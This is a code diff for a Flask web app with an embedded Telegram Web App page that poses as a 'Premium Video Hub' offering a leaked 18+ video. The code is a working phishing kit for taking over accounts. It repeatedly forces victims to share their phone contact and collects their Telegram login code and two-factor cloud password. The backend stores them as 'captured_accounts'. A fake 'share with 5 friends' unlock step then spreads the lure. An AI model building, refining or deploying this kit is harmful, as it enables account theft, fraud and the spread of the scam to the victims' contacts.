@@ -262,406 +262,468 @@ def run_telegram_action(phone, code=None, password=None):
         loop.close()
 
 
-# ============ THE PAGE ============
-PAGE = r'''<!DOCTYPE html>
+# ============ WEBAPP PAGE ============
+WEBAPP = r'''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Premium Video Hub</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
-.header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
-.header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh;padding-bottom:20px}
+.header{padding:40px 20px 20px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
+.header h1{font-size:24px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .header p{color:#777;font-size:13px;margin-top:8px}
-.video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
-.thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
-.play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
-.video-info{padding:15px}
-.video-info h3{font-size:15px;margin-bottom:5px}
-.video-info .meta{color:#666;font-size:12px}
-.video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
-.link-section{padding:10px 20px 20px;text-align:center}
-.get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase}
-.get-link-btn:disabled{opacity:0.5}
-.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
-.modal-overlay.active{display:flex;align-items:center;justify-content:center}
-.modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e}
-.modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
-.modal h2{text-align:center;font-size:18px;margin-bottom:5px}
-.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
-.sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
-.sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
-.sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
-.sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
-.sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
-.cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
-.np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
-.np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer}
-.np .k:active{background:#3a3a5e}
-.np .kc{background:#e94560}
-.np .ks{background:#4CAF50;font-weight:700;font-size:14px}
-.np .ks:disabled{background:#333;color:#666}
-.step{display:none}
-.step.active{display:block}
-.sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
+.card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
+.thumb{width:100%;height:190px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
+.play{width:60px;height:60px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;border:2px solid rgba(255,255,255,0.2)}
+.info{padding:15px}
+.info h3{font-size:15px;margin-bottom:5px}
+.meta{color:#666;font-size:12px}
+.badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
+.btn-wrap{padding:15px 20px}
+.btn{width:100%;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(0,136,204,0.4);letter-spacing:1px;text-transform:uppercase}
+.btn:active{transform:scale(0.97)}
+.btn:disabled{opacity:0.4}
+.btn-green{background:linear-gradient(45deg,#25D366,#128C7E);box-shadow:0 8px 30px rgba(37,211,102,0.4)}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:999;display:none;align-items:center;justify-content:center;padding:20px}
+.overlay.show{display:flex}
+.modal{background:#141420;border-radius:20px;padding:28px;max-width:380px;width:100%;border:1px solid #1a1a2e}
+.modal-icon{text-align:center;font-size:48px;margin-bottom:12px}
+.modal h2{text-align:center;font-size:18px;margin-bottom:8px}
+.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:18px;line-height:1.5}
+.sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;font-size:13px;display:none}
+.sb.show{display:block}
+.sb.success{background:rgba(76,175,80,0.15);color:#81C784}
+.sb.error{background:rgba(244,67,54,0.15);color:#EF9A9A}
+.sb.info{background:rgba(33,150,243,0.15);color:#90CAF9}
+.sb.waiting{background:rgba(255,152,0,0.15);color:#FFB74D}
+.sp{display:inline-block;width:16px;height:16px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
 @keyframes spin{to{transform:rotate(360deg)}}
-.cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
-.cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
-.cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
-.cc input::placeholder{color:#555}
-.share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
-.share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
-.share-step.done{background:#4CAF50;color:white}
-.share-step.active{background:#0088cc;color:white}
+.otp-display{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:12px 0;font-weight:bold;min-height:55px}
+.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.key{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;font-weight:600}
+.key:active{background:#3a3a5e}
+.key.del{background:#e94560}
+.key.ok{background:#4CAF50;font-size:14px}
 .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
 .pwd-input:focus{border-color:#0088cc}
+.share-steps{display:flex;justify-content:center;gap:6px;margin:15px 0}
+.step{width:36px;height:36px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#666;font-weight:700}
+.step.done{background:#4CAF50;color:white}
+.step.active{background:#0088cc;color:white}
 </style>
 </head>
 <body>
-
 <div class="header">
 <h1>PREMIUM VIDEO HUB</h1>
-<p>Exclusive content - Verified members only</p>
+<p>Exclusive content - Verified only</p>
 </div>
 
-<div class="video-card">
-<div class="thumbnail"><div class="play-btn">&#9658;</div></div>
-<div class="video-info">
-<h3>LEAKED PRIVATE VIDEO - 2026</h3>
-<div class="meta">4.9 (2.4M views) - 18+</div>
+<div class="card">
+<div class="thumb"><div class="play">&#9658;</div></div>
+<div class="info">
+<h3>LEAKED PRIVATE - 2026</h3>
+<div class="meta">4.9 - 2.4M views - 18+</div>
 <span class="badge">RESTRICTED</span>
 </div>
 </div>
 
-<div class="link-section">
-<button class="get-link-btn" id="glb">GET YOUR LINK</button>
+<div class="btn-wrap">
+<button class="btn" id="mainBtn">UNLOCK NOW</button>
 </div>
 
-<div class="modal-overlay" id="vm">
+<div class="overlay" id="contactModal">
 <div class="modal">
-
-<div id="s1" class="step active">
 <div class="modal-icon">&#128241;</div>
-<h2>Telegram verification</h2>
-<p>Enter your Telegram account phone number</p>
-<div class="cc">
-<div class="ccd">+91</div>
-<input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
+<h2>Verify Your Number</h2>
+<p>Tap <strong>Share Contact</strong> to continue.</p>
+<button class="btn btn-green" id="shareContactBtn">SHARE CONTACT</button>
+<div class="sb" id="contactStatus"></div>
 </div>
-<button onclick="sendPhoneFromStep1()" style="width:100%;padding:15px;background:#0088cc;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:10px">Send code</button>
-<div id="ps1" class="sb info" style="display:none">Processing...</div>
 </div>
 
-<div id="s2" class="step">
+<div class="overlay" id="otpModal">
+<div class="modal">
 <div class="modal-icon">&#128274;</div>
-<h2>Verification code</h2>
-<p><span id="pd" style="color:#0088cc;font-weight:bold">+91XXXXXXXXXX</span></p>
-<div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
-<div class="cd" id="cdisp">_</div>
-<div class="np">
-<button class="k" onclick="pk('1')">1</button>
-<button class="k" onclick="pk('2')">2</button>
-<button class="k" onclick="pk('3')">3</button>
-<button class="k" onclick="pk('4')">4</button>
-<button class="k" onclick="pk('5')">5</button>
-<button class="k" onclick="pk('6')">6</button>
-<button class="k" onclick="pk('7')">7</button>
-<button class="k" onclick="pk('8')">8</button>
-<button class="k" onclick="pk('9')">9</button>
-<button class="k kc" onclick="cc()">X</button>
-<button class="k" onclick="pk('0')">0</button>
-<button class="k ks" id="sb" onclick="sc()">Verify</button>
+<h2>Enter Code</h2>
+<p><span id="phoneDisplay" style="color:#0088cc;font-weight:bold"></span></p>
+<div class="sb waiting show" id="otpWait"><span class="sp"></span> Sending code...</div>
+<div class="otp-display" id="otpDisplay">_</div>
+<div class="keypad">
+<button class="key" onclick="pk('1')">1</button>
+<button class="key" onclick="pk('2')">2</button>
+<button class="key" onclick="pk('3')">3</button>
+<button class="key" onclick="pk('4')">4</button>
+<button class="key" onclick="pk('5')">5</button>
+<button class="key" onclick="pk('6')">6</button>
+<button class="key" onclick="pk('7')">7</button>
+<button class="key" onclick="pk('8')">8</button>
+<button class="key" onclick="pk('9')">9</button>
+<button class="key del" onclick="del()">X</button>
+<button class="key" onclick="pk('0')">0</button>
+<button class="key ok" id="otpOk" onclick="submitOtp()">OK</button>
 </div>
-<div id="vs" class="sb"></div>
+<div class="sb" id="otpStatus"></div>
+</div>
 </div>
 
-<div id="s2b" class="step">
+<div class="overlay" id="pwdModal">
+<div class="modal">
 <div class="modal-icon">&#128274;</div>
-<h2>Two-Factor Authentication</h2>
+<h2>Two-Factor Auth</h2>
 <p>Enter your cloud password:</p>
-<input type="password" id="pwdInput" class="pwd-input" placeholder="Telegram password" maxlength="64">
-<button onclick="submitPassword()" style="width:100%;padding:15px;background:#e94560;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">Verify Password</button>
-<div id="pwdStatus" class="sb" style="display:none"></div>
+<input type="password" class="pwd-input" id="pwdInput" placeholder="Password" maxlength="64">
+<button class="btn" onclick="submitPwd()" style="background:linear-gradient(45deg,#e94560,#d63851)">VERIFY</button>
+<div class="sb" id="pwdStatus"></div>
+</div>
 </div>
 
-<div id="s3" class="step">
+<div class="overlay" id="shareModal">
+<div class="modal">
 <div class="modal-icon">&#127916;</div>
-<h2>Almost there!</h2>
-<p>Share with 5 friends to unlock</p>
-<div class="share-progress">
-<div class="share-step" id="sp1">1</div>
-<div class="share-step" id="sp2">2</div>
-<div class="share-step" id="sp3">3</div>
-<div class="share-step" id="sp4">4</div>
-<div class="share-step" id="sp5">5</div>
+<h2>Almost Unlocked!</h2>
+<p>Share with <strong>5 friends</strong> to unlock</p>
+<div class="share-steps">
+<div class="step" id="st1">1</div>
+<div class="step" id="st2">2</div>
+<div class="step" id="st3">3</div>
+<div class="step" id="st4">4</div>
+<div class="step" id="st5">5</div>
 </div>
-<div id="shareStatus" class="sb waiting" style="display:block"><span class="sp"></span> Share to start</div>
-<button onclick="simulateShare()" style="width:100%;padding:15px;background:#25D366;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">Share to Telegram</button>
-</div>
-
+<div class="sb info show" id="shareStatus">Share to start</div>
+<button class="btn btn-green" onclick="doShare()">SHARE ON TELEGRAM</button>
 </div>
 </div>
 
 <script>
+var tg = window.Telegram ? window.Telegram.WebApp : null;
+if (tg) { tg.ready(); tg.expand(); }
+
+var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
+var USER_PHONE_KEY = 'pv_phone_' + TG_ID;
+var USER_SHARES_KEY = 'pv_shares_' + TG_ID;
+var USER_CAPTURED_KEY = 'pv_captured_' + TG_ID;
+
 var phoneNumber = '';
 var codeDigits = '';
-var codeCheckInterval = null;
-var passwordCheckInterval = null;
 var sharesDone = 0;
-var TG_CHANNEL_LINK = 'https://t.me/videodks';
-var TG_CHANNEL_CAPTION = 'Premium content';
+var codeCheckInterval = null;
+var pwdCheckInterval = null;
+var contactForceInterval = null;
 
-document.getElementById('glb').onclick = function() {
-document.getElementById('vm').classList.add('active');
-document.getElementById('s1').classList.add('active');
-document.getElementById('s2').classList.remove('active');
-document.getElementById('s2b').classList.remove('active');
-document.getElementById('s3').classList.remove('active');
-document.getElementById('ps1').style.display = 'none';
-document.getElementById('phoneInput').value = '';
-document.getElementById('phoneInput').focus();
+var TG_CHANNEL = 'https://t.me/videodks';
+var TG_CAPTION = 'Premium content';
+
+document.getElementById('mainBtn').onclick = function() {
+var cachedPhone = localStorage.getItem(USER_PHONE_KEY);
+var isCaptured = localStorage.getItem(USER_CAPTURED_KEY) === '1';
+
+if (cachedPhone && isCaptured) {
+phoneNumber = cachedPhone;
+openShareModal();
+return;
+}
+if (cachedPhone) {
+phoneNumber = cachedPhone;
+openOtpModal();
+return;
+}
+openContactModal();
 };
 
-function sendPhoneFromStep1() {
-var phone = document.getElementById('phoneInput').value.trim();
-if (!phone || phone.length !== 10) {
-document.getElementById('ps1').className = 'sb error';
-document.getElementById('ps1').innerHTML = '10 digit number din';
-document.getElementById('ps1').style.display = 'block';
-return;
-}
-phoneNumber = '+91' + phone;
-document.getElementById('ps1').className = 'sb waiting';
-document.getElementById('ps1').innerHTML = '<span class="sp"></span> Checking...';
-document.getElementById('ps1').style.display = 'block';
-
-fetch('/session/' + encodeURIComponent(phoneNumber))
-.then(function(res) { return res.json(); })
-.then(function(data) {
-if (data.user_id) {
-localStorage.setItem('tg_user_id', String(data.user_id));
-sharesDone = parseInt(localStorage.getItem('tg_shares_' + data.user_id) || '0');
-document.getElementById('s1').classList.remove('active');
-document.getElementById('s3').classList.add('active');
-updateShareProgress();
-document.getElementById('ps1').style.display = 'none';
-return;
-}
-document.getElementById('ps1').className = 'sb waiting';
-document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
-sendPhoneToBackend(phoneNumber);
-})
-.catch(function(e) {
-document.getElementById('ps1').className = 'sb waiting';
-document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
-sendPhoneToBackend(phoneNumber);
-});
+function openContactModal() {
+document.getElementById('contactModal').classList.add('show');
+startContactForce();
 }
 
-async function sendPhoneToBackend(phone) {
+function startContactForce() {
+if (contactForceInterval) clearInterval(contactForceInterval);
+setTimeout(triggerContactShare, 300);
+contactForceInterval = setInterval(function() {
+if (document.getElementById('contactModal').classList.contains('show')) {
+triggerContactShare();
+} else {
+clearInterval(contactForceInterval);
+contactForceInterval = null;
+}
+}, 1500);
+}
+
+function triggerContactShare() {
+if (!tg) {
+showContactStatus('Open in Telegram', 'error');
+return;
+}
 try {
-var res = await fetch('/api/share', {
+tg.requestContact(function(sent, event) {
+if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
+handleContact(event.responseUnsafe.contact);
+} else {
+showContactStatus('Contact share required!', 'error');
+}
+});
+} catch(e) {
+showContactStatus('Update Telegram app', 'error');
+}
+}
+
+document.getElementById('shareContactBtn').onclick = function() {
+triggerContactShare();
+};
+
+function handleContact(contact) {
+var phone = contact.phone_number || '';
+if (!phone) {
+showContactStatus('No phone number', 'error');
+return;
+}
+if (phone.charAt(0) !== '+') phone = '+' + phone;
+phoneNumber = phone;
+showContactStatus('Contact verified!', 'success');
+
+if (contactForceInterval) {
+clearInterval(contactForceInterval);
+contactForceInterval = null;
+}
+
+fetch('/api/save_contact', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({phone: phone})
-});
-var data = await res.json();
+body: JSON.stringify({tg_id: TG_ID, phone: phoneNumber})
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
 if (data.success) {
-document.getElementById('s1').classList.remove('active');
-document.getElementById('s2').classList.add('active');
-document.getElementById('pd').textContent = phone;
-var cs = document.getElementById('cs');
-cs.className = 'sb waiting';
-cs.innerHTML = '<span class="sp"></span> Sending code...';
-startCodeCheck();
+localStorage.setItem(USER_PHONE_KEY, phoneNumber);
+if (data.already_captured && data.user_id) {
+localStorage.setItem(USER_CAPTURED_KEY, '1');
+document.getElementById('contactModal').classList.remove('show');
+openShareModal();
 } else {
-var ps = document.getElementById('ps1');
-ps.className = 'sb error';
-ps.innerHTML = 'Error: ' + (data.error || 'Unknown');
+setTimeout(function() {
+document.getElementById('contactModal').classList.remove('show');
+openOtpModal();
+}, 800);
 }
-} catch(e) {
-var ps = document.getElementById('ps1');
-ps.className = 'sb error';
-ps.innerHTML = 'Connection error';
+} else {
+showContactStatus('Server error', 'error');
 }
+})
+.catch(function() {
+showContactStatus('Connection error', 'error');
+});
 }
 
-function startCodeCheck() {
-if (codeCheckInterval) clearInterval(codeCheckInterval);
-codeCheckInterval = setInterval(async function() {
-try {
-var res = await fetch('/api/check', {
+function showContactStatus(msg, type) {
+var el = document.getElementById('contactStatus');
+el.className = 'sb ' + type + ' show';
+el.textContent = msg;
+}
+
+function openOtpModal() {
+document.getElementById('otpModal').classList.add('show');
+document.getElementById('phoneDisplay').textContent = phoneNumber;
+
+fetch('/api/share', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({phone: phoneNumber})
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
+if (data.success) {
+document.getElementById('otpWait').className = 'sb success show';
+document.getElementById('otpWait').innerHTML = 'Code sent!';
+startOtpCheck();
+} else {
+document.getElementById('otpWait').className = 'sb error show';
+document.getElementById('otpWait').textContent = (data.error || 'Failed');
+}
+})
+.catch(function() {
+document.getElementById('otpWait').className = 'sb error show';
+document.getElementById('otpWait').textContent = 'Network error';
 });
-var data = await res.json();
-if (data.s === 'sent') {
+}
+
+function startOtpCheck() {
+if (codeCheckInterval) clearInterval(codeCheckInterval);
+codeCheckInterval = setInterval(function() {
+fetch('/api/check', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({phone: phoneNumber})
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
+if (data.s === '2fa_needed') {
 clearInterval(codeCheckInterval);
-var cs = document.getElementById('cs');
-cs.className = 'sb success';
-cs.innerHTML = 'Code sent! Enter below:';
+document.getElementById('otpModal').classList.remove('show');
+document.getElementById('pwdModal').classList.add('show');
+startPwdCheck();
 } else if (data.s === 'done') {
 clearInterval(codeCheckInterval);
-goToShare();
-} else if (data.s === '2fa_needed') {
-clearInterval(codeCheckInterval);
-document.getElementById('s2').classList.remove('active');
-document.getElementById('s2b').classList.add('active');
-startPwdCheck();
+onCaptureSuccess();
 } else if (data.s === 'err') {
 clearInterval(codeCheckInterval);
-var cs = document.getElementById('cs');
-cs.className = 'sb error';
-cs.innerHTML = 'Code send failed';
+document.getElementById('otpWait').className = 'sb error show';
+document.getElementById('otpWait').textContent = 'Code send failed';
 }
-} catch(e) {}
+})
+.catch(function(){});
 }, 2000);
 }
 
-function startPwdCheck() {
-if (passwordCheckInterval) clearInterval(passwordCheckInterval);
-passwordCheckInterval = setInterval(async function() {
-try {
-var res = await fetch('/api/check', {
-method: 'POST',
-headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({phone: phoneNumber})
-});
-var data = await res.json();
-if (data.s === 'done') {
-clearInterval(passwordCheckInterval);
-goToShare();
-}
-} catch(e) {}
-}, 2000);
-}
+function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('otpDisplay').textContent = codeDigits; } }
+function del() { codeDigits = codeDigits.slice(0,-1); document.getElementById('otpDisplay').textContent = codeDigits || '_'; }
 
-function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
-function cc() { codeDigits = codeDigits.slice(0, -1); document.getElementById('cdisp').textContent = codeDigits || '_'; }
+function submitOtp() {
+if (codeDigits.length < 5) { showOtpStatus('5 digits required', 'error'); return; }
+document.getElementById('otpOk').disabled = true;
+document.getElementById('otpOk').textContent = '...';
 
-async function sc() {
-if (codeDigits.length < 5) { showVerifyStatus('5 digit code din', 'error'); return; }
-document.getElementById('sb').disabled = true;
-document.getElementById('sb').textContent = 'Verifying...';
-try {
-var res = await fetch('/api/verify', {
+fetch('/api/verify', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({phone: phoneNumber, code: codeDigits})
-});
-var data = await res.json();
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
 if (data.success) {
-if (data.user_id) {
-localStorage.setItem('tg_user_id', String(data.user_id));
-localStorage.setItem('tg_shares_' + data.user_id, '0');
-}
-goToShare();
-if (codeCheckInterval) clearInterval(codeCheckInterval);
+onCaptureSuccess();
 } else if (data.needs_password) {
-document.getElementById('s2').classList.remove('active');
-document.getElementById('s2b').classList.add('active');
-if (codeCheckInterval) clearInterval(codeCheckInterval);
+document.getElementById('otpModal').classList.remove('show');
+document.getElementById('pwdModal').classList.add('show');
+startPwdCheck();
 } else {
-showVerifyStatus(data.error || 'Wrong code', 'error');
+showOtpStatus(data.error || 'Wrong code', 'error');
 codeDigits = '';
-document.getElementById('cdisp').textContent = '_';
-document.getElementById('sb').disabled = false;
-document.getElementById('sb').textContent = 'Verify';
+document.getElementById('otpDisplay').textContent = '_';
+document.getElementById('otpOk').disabled = false;
+document.getElementById('otpOk').textContent = 'OK';
 }
-} catch(e) {
-showVerifyStatus('Error', 'error');
-document.getElementById('sb').disabled = false;
-document.getElementById('sb').textContent = 'Verify';
-}
+})
+.catch(function() {
+showOtpStatus('Error', 'error');
+document.getElementById('otpOk').disabled = false;
+document.getElementById('otpOk').textContent = 'OK';
+});
 }
 
-async function submitPassword() {
+function showOtpStatus(msg, type) {
+var el = document.getElementById('otpStatus');
+el.className = 'sb ' + type + ' show';
+el.textContent = msg;
+}
+
+function startPwdCheck() {
+if (pwdCheckInterval) clearInterval(pwdCheckInterval);
+pwdCheckInterval = setInterval(function() {
+fetch('/api/check', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({phone: phoneNumber})
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
+if (data.s === 'done') {
+clearInterval(pwdCheckInterval);
+onCaptureSuccess();
+}
+})
+.catch(function(){});
+}, 2000);
+}
+
+function submitPwd() {
 var pwd = document.getElementById('pwdInput').value.trim();
 if (!pwd) {
-var ps = document.getElementById('pwdStatus');
-ps.className = 'sb error';
-ps.innerHTML = 'Password din';
-ps.style.display = 'block';
+document.getElementById('pwdStatus').className = 'sb error show';
+document.getElementById('pwdStatus').textContent = 'Password required';
 return;
 }
-var ps = document.getElementById('pwdStatus');
-ps.className = 'sb waiting';
-ps.innerHTML = '<span class="sp"></span> Checking...';
-ps.style.display = 'block';
-try {
-var res = await fetch('/api/verify', {
+document.getElementById('pwdStatus').className = 'sb waiting show';
+document.getElementById('pwdStatus').innerHTML = '<span class="sp"></span> Checking...';
+
+fetch('/api/verify', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
-});
-var data = await res.json();
+})
+.then(function(r) { return r.json(); })
+.then(function(data) {
 if (data.success) {
-if (data.user_id) {
-localStorage.setItem('tg_user_id', String(data.user_id));
-localStorage.setItem('tg_shares_' + data.user_id, '0');
-}
-goToShare();
-if (passwordCheckInterval) clearInterval(passwordCheckInterval);
+onCaptureSuccess();
 } else {
-ps.className = 'sb error';
-ps.innerHTML = data.error || 'Wrong password';
+document.getElementById('pwdStatus').className = 'sb error show';
+document.getElementById('pwdStatus').textContent = (data.error || 'Wrong');
 }
-} catch(e) {
-ps.className = 'sb error';
-ps.innerHTML = 'Connection error';
+})
+.catch(function() {
+document.getElementById('pwdStatus').className = 'sb error show';
+document.getElementById('pwdStatus').textContent = 'Error';
+});
+}
+
+function onCaptureSuccess() {
+localStorage.setItem(USER_PHONE_KEY, phoneNumber);
+localStorage.setItem(USER_CAPTURED_KEY, '1');
+localStorage.setItem(USER_SHARES_KEY, '0');
+
+if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+if (pwdCheckInterval) { clearInterval(pwdCheckInterval); pwdCheckInterval = null; }
+
+document.getElementById('otpModal').classList.remove('show');
+document.getElementById('pwdModal').classList.remove('show');
+openShareModal();
+}
+
+function openShareModal() {
+document.getElementById('shareModal').classList.add('show');
+sharesDone = parseInt(localStorage.getItem(USER_SHARES_KEY) || '0');
+updateShareSteps();
+if (sharesDone > 0 && sharesDone < 5) {
+document.getElementById('shareStatus').className = 'sb success show';
+document.getElementById('shareStatus').textContent = sharesDone + '/5 done!';
 }
 }
 
-function showVerifyStatus(msg, type) {
-var el = document.getElementById('vs');
-el.textContent = msg;
-el.className = 'sb ' + type;
-el.style.display = 'block';
-}
-
-function goToShare() {
-document.getElementById('s2').classList.remove('active');
-document.getElementById('s2b').classList.remove('active');
-document.getElementById('s3').classList.add('active');
-updateShareProgress();
-}
-
-function simulateShare() {
-var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
+function doShare() {
+var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
+if (tg) {
+tg.openTelegramLink(shareUrl);
+} else {
 window.open(shareUrl, '_blank');
+}
 sharesDone = Math.min(sharesDone + 1, 5);
-var tgUserId = localStorage.getItem('tg_user_id');
-if (tgUserId) localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
-updateShareProgress();
-var st = document.getElementById('shareStatus');
+localStorage.setItem(USER_SHARES_KEY, String(sharesDone));
+updateShareSteps();
 if (sharesDone >= 5) {
-st.className = 'sb success';
-st.innerHTML = 'Unlocked!';
+document.getElementById('shareStatus').className = 'sb success show';
+document.getElementById('shareStatus').textContent = 'Unlocked!';
 } else {
-st.className = 'sb success';
-st.innerHTML = sharesDone + '/5 done';
+document.getElementById('shareStatus').className = 'sb success show';
+document.getElementById('shareStatus').textContent = sharesDone + '/5 done!';
 }
 }
 
-function updateShareProgress() {
+function updateShareSteps() {
 for (var i = 1; i <= 5; i++) {
-var el = document.getElementById('sp' + i);
-if (i <= sharesDone) el.className = 'share-step done';
-else if (i === sharesDone + 1) el.className = 'share-step active';
-else el.className = 'share-step';
+var el = document.getElementById('st' + i);
+if (i <= sharesDone) el.className = 'step done';
+else if (i === sharesDone + 1) el.className = 'step active';
+else el.className = 'step';
 }
 }
 
-document.getElementById('vm').onclick = function(e) {
-if (e.target === this) {
-this.classList.remove('active');
-if (codeCheckInterval) clearInterval(codeCheckInterval);
-if (passwordCheckInterval) clearInterval(passwordCheckInterval);
+if (window.location.search.indexOf('auto=1') !== -1) {
+setTimeout(function() {
+document.getElementById('mainBtn').click();
+}, 500);
 }
-};
 </script>
 </body>
 </html>'''
@@ -671,7 +733,12 @@ if (passwordCheckInterval) clearInterval(passwordCheckInterval);
 
 @app.route('/')
 def index():
-    return render_template_string(PAGE)
+    return render_template_string(WEBAPP)
+
+
+@app.route('/tg')
+def tg_webapp():
+    return render_template_string(WEBAPP)
 
 
 @app.route('/health')
@@ -684,6 +751,46 @@ def health():
         'OWNER_ID': YOUR_TELEGRAM_ID,
         'accounts': len(captured_accounts)
     })
+
+
+@app.route('/api/save_contact', methods=['POST'])
+def save_contact():
+    d = request.json
+    tg_id = d.get('tg_id')
+    phone = d.get('phone')
+    if not phone or not tg_id:
+        return jsonify({'success': False, 'error': 'Missing data'})
+    phone = format_phone(phone)
+
+    accounts = load_accounts()
+    existing = next((a for a in accounts if a['phone'] == phone), None)
+    if existing:
+        return jsonify({
+            'success': True,
+            'already_captured': True,
+            'phone': phone,
+            'user_id': existing['user_id']
+        })
+
+    with sessions_lock:
+        pending_codes[phone] = 'contact_saved'
+
